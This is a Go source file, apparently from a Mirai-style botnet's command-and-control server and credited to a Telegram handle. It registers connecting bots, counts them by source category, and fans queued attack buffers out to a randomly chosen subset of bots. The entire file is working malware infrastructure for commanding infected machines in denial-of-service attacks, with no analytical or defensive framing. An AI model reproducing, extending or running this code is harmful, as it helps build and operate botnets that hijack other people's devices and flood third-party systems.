// by juan @ipmiv2 on telegram

package main

import (
    "time"
    "math/rand"
    "fmt"
    "net"
    "sync/atomic"
)

type AttackSend struct {
    buf     []byte
    count   int
    botCata string
}

type ClientList struct {
    uid         int64
    count       int64
    clients     map[int64]*Bot
    clientIPs   map[string]*Bot
    addQueue    chan *Bot
    delQueue    chan *Bot
    atkQueue    chan *AttackSend
    distViewReq chan struct{}
    distViewRes chan map[string]int
}

func NewClientList() *ClientList {
    c := &ClientList{
        uid:         0,
        count:       0,
        clients:     make(map[int64]*Bot),
        clientIPs:   make(map[string]*Bot),
        addQueue:    make(chan *Bot, 256),
        delQueue:    make(chan *Bot, 256),
        atkQueue:    make(chan *AttackSend, 1024),
        distViewReq: make(chan struct{}),
        distViewRes: make(chan map[string]int),
    }
    go c.worker()
    return c
}

func (this *ClientList) Count() int64 {
    return atomic.LoadInt64(&this.count)
}

func (this *ClientList) Distribution() map[string]int {
    this.distViewReq <- struct{}{}
    return <-this.distViewRes
}

func extractIP(addr net.Addr) string {
    if tcpAddr, ok := addr.(*net.TCPAddr); ok {
        return tcpAddr.IP.String()
    }
    host, _, _ := net.SplitHostPort(addr.String())
    return host
}

func (this *ClientList) AddClient(c *Bot) {
    this.addQueue <- c
}

func (this *ClientList) DelClient(c *Bot) {
    this.delQueue <- c
}

func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
    this.atkQueue <- &AttackSend{buf, maxbots, botCata}
}

func (this *ClientList) worker() {
    rand.Seed(time.Now().UTC().UnixNano())

    for {
        select {
        case add := <-this.addQueue:
            clientIP := extractIP(add.conn.RemoteAddr())

            if existingBot, exists := this.clientIPs[clientIP]; exists {
                existingBot.markedForReplacement = true
                existingBot.conn.Close()
                delete(this.clients, int64(existingBot.uid))
                delete(this.clientIPs, clientIP)
                atomic.AddInt64(&this.count, -1)
            }

            atomic.AddInt64(&this.count, 1)
            this.uid++
            add.uid = int(this.uid)
            this.clients[int64(add.uid)] = add
            this.clientIPs[clientIP] = add

            fmt.Printf("\x1b[1;36mBot Joined  \x1b[0;37m| \x1b[1;31mIP:\x1b[0;37m %s (%s) [UID: %d] [Total: %d]\n",
                clientIP, add.source, add.uid, atomic.LoadInt64(&this.count))

        case del := <-this.delQueue:
            clientIP := extractIP(del.conn.RemoteAddr())

            if del.markedForReplacement {
                continue
            }

            if trackedBot, exists := this.clientIPs[clientIP]; exists && trackedBot.uid == del.uid {
                delete(this.clients, int64(del.uid))
                delete(this.clientIPs, clientIP)
                atomic.AddInt64(&this.count, -1)
                fmt.Printf("\x1b[1;34mBot Left    \x1b[0;37m| \x1b[1;31mIP:\x1b[0;37m %s (%s) [UID: %d] [Total: %d]\n",
                    clientIP, del.source, del.uid, atomic.LoadInt64(&this.count))
            }

        case atk := <-this.atkQueue:
            keys := make([]int64, 0, len(this.clients))
            for k := range this.clients {
                keys = append(keys, k)
            }
            rand.Shuffle(len(keys), func(i, j int) {
                keys[i], keys[j] = keys[j], keys[i]
            })

            sent := 0
            for _, uid := range keys {
                bot := this.clients[uid]
                if atk.count != -1 && sent >= atk.count {
                    break
                }
                if atk.botCata == "" || atk.botCata == bot.source {
                    // Correct implementation of non-blocking send to Bot channel
                    select {
                    case bot.sendBuf <- atk.buf:
                        sent++
                    default:
                    }
                }
            }

        case <-this.distViewReq:
            res := make(map[string]int)
            for _, v := range this.clients {
                res[v.source]++
            }
            this.distViewRes <- res
        }
    }
}